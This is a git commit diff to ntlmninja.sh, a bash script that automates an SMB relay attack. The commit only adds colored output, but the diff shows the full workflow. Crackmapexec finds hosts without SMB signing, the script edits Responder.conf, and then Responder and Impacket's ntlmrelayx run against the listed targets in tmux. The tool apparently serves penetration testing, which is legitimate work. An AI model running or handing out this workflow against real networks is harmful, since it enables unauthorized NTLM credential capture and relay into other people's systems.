7857ed79f577b9ad0a7026d218f29de7771c88bb
sp3ttr0 <77888892+sp3ttr0@users.noreply.github.com>
2025-01-15 13:20:08 +0800

    add colors to font

--- ntlmninja.sh
+++ ntlmninja.sh
@@ -18,18 +18,25 @@ window1="responder"
 window2="ntlmrelayx"
 TARGET_SMB_FILE="vulnerable_smb_targets.txt" 
 
+# Define color codes
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[0;33m'
+BLUE='\033[0;34m'
+NC='\033[0m' # No Color
+
 # Print help
 print_help() {
-    echo "Usage: $0 [-f TARGET_FILE] [-h]"
-    echo "  -f TARGET_FILE   The file containing all targets to scan for misconfigured smb signing."
-    echo "  -h               Display this help and exit"
+    echo -e "${BLUE}Usage: $0 [-f TARGET_FILE] [-h]${NC}"
+    echo -e "  ${YELLOW}-f TARGET_FILE${NC}   The file containing all targets to scan for misconfigured smb signing."
+    echo -e "  ${YELLOW}-h${NC}               Display this help and exit"
 }
 
 # Check if a tool is installed
 check_tool() {
-    echo "[*] Checking $1 if installed..."
+    echo -e "[*] Checking ${YELLOW}$1${NC} if installed..."
     if ! which $1 >/dev/null; then
-        echo "[!] $1 is not installed. Please install it and try again."
+        echo -e "${RED}[!] $1 is not installed. Please install it and try again.${NC}"
         exit 1
     fi
 }
@@ -38,8 +45,8 @@ check_tool() {
 run_crackmapexec() {
     # Check if the target list for SMB Relay already exists
     if [[ ! -f "${TARGET_SMB_FILE}" ]]; then
-        echo "[*] Commence checking on targets with misconfigured smb signing"
-        echo "[*] Generating list of misconfigured smb signing targets in this output file "${TARGET_SMB_FILE}" via crackmapexec..."
+        echo -e "[*] ${BLUE}Commence checking on targets with misconfigured smb signing${NC}"
+        echo -e "[*] ${GREEN}Generating list of misconfigured smb signing targets in this output file ${TARGET_SMB_FILE}${NC} via crackmapexec..."
         crackmapexec smb --gen-relay-list "${TARGET_SMB_FILE}" "${TARGET_FILE}" | grep "signing:False"
     fi
 }
@@ -48,40 +55,40 @@ run_crackmapexec() {
 edit_responder_conf() {
     if [ -f "${responder_config_file}" ]; then
         if grep -qE '^SMB = Off$' "${responder_config_file}" && grep -qE '^HTTP = Off$' "${responder_config_file}"; then
-            echo "[*] Responder.conf already has SMB and HTTP settings set to 'Off'."
+            echo -e "[*] ${GREEN}Responder.conf already has SMB and HTTP settings set to 'Off'.${NC}"
             return
         else
-            echo "[*] Turning off SMB and HTTP on Responder.conf..."
+            echo -e "[*] ${YELLOW}Turning off SMB and HTTP on Responder.conf...${NC}"
             sudo sed -i 's/^SMB = .*/SMB = /' "${responder_config_file}"
             sudo sed -i "/^SMB =/ s/$/Off/" "${responder_config_file}"
             sudo sed -i 's/^HTTP = .*/HTTP = /' "${responder_config_file}"
             sudo sed -i "/^HTTP =/ s/$/Off/" "${responder_config_file}"
-            echo "[+] Turned off SMB and HTTP successfully."
+            echo -e "[+] ${GREEN}Turned off SMB and HTTP successfully.${NC}"
         fi
     else
-        echo "[!] Responder.conf file not found. Please make sure Responder is installed and configured properly."
+        echo -e "${RED}[!] Responder.conf file not found. Please make sure Responder is installed and configured properly.${NC}"
         exit 1
     fi
 }
 
 # Run SMB Relay Attack
 run_smb_relay_attack() {
-    echo "[*] Starting SMB Relay Attack..."
+    echo -e "[*] ${BLUE}Starting SMB Relay Attack...${NC}"
     # create tmux session
-    echo "[+] Creating session named ${session_name}..."
+    echo -e "[+] ${GREEN}Creating session named ${session_name}...${NC}"
     tmux new-session -d -s $session_name
     # add responder window
-    echo "[+] Creating window named ${window1}..."
+    echo -e "[+] ${GREEN}Creating window named ${window1}...${NC}"
     tmux rename-window $window1
-    echo "[*] Running responder on window ${window1}..."
+    echo -e "[*] ${YELLOW}Running responder on window ${window1}...${NC}"
     # run the responder
     tmux send-keys "responder -I eth0" C-m
     # add ntlmrelayx window
-    echo "[+] Creating window named ${window2}..."
+    echo -e "[+] ${GREEN}Creating window named ${window2}...${NC}"
     tmux new-window
     tmux rename-window $window2
     # run the ntlmrelayx
-    echo "[*] Running Impacket's ntlmrelayx on window ${window2}..."
+    echo -e "[*] ${YELLOW}Running Impacket's ntlmrelayx on window ${window2}...${NC}"
     tmux send-keys "impacket-ntlmrelayx -smb2support -tf ${TARGET_SMB_FILE}" C-m
     # attach tmux session
     tmux -CC attach-session -t $session_name
@@ -97,11 +104,11 @@ while getopts "f:h" opt; do
         exit 0
         ;;
     \?)
-        echo "[!] Invalid option: -$OPTARG" >&2
+        echo -e "${RED}[!] Invalid option: -$OPTARG${NC}" >&2
         exit 1
         ;;
     :)
-        echo "[!] Option -$OPTARG requires an argument." >&2
+        echo -e "${RED}[!] Option -$OPTARG requires an argument.${NC}" >&2
         exit 1
         ;;
     esac
@@ -109,13 +116,13 @@ done
 
 # Start SMB Relay Attack
 if  tmux list-session | grep -qE "^$session_name:" > /dev/null; then
-    echo "[!] Session name ${session_name} already exists."
+    echo -e "${RED}[!] Session name ${session_name} already exists.${NC}"
     # attach tmux session
     tmux -CC attach-session -t $session_name
 else
     # Check required arguments
     if [ -z "${TARGET_FILE}" ]; then
-        echo "[!] Usage: ./$0 [-f TARGET_FILE]"
+        echo -e "${RED}[!] Usage: ./$0 [-f TARGET_FILE]${NC}"
         exit 1
     fi
     # Check if required tools are installed
@@ -129,6 +136,6 @@ else
         sleep 2
         run_smb_relay_attack
     else
-        echo "[!] There are no misconfigured smb signing targets found. Exiting..."
+        echo -e "${RED}[!] There are no misconfigured smb signing targets found. Exiting...${NC}"
     fi
 fi
